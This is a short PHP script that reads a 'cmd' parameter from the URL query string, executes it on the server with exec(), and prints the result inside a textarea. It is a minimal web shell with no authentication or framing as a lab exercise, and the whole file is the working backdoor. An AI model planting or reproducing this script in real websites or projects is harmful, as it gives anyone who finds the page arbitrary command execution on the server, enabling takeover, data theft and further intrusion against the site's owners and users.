<?php


	if(isset($_GET['cmd']))$cmd=$_GET['cmd'];


	$line = exec($cmd,$output);

	echo '<textarea style="width:100%;height:500px">';

	var_dump($output);

	echo '</textarea>';

?>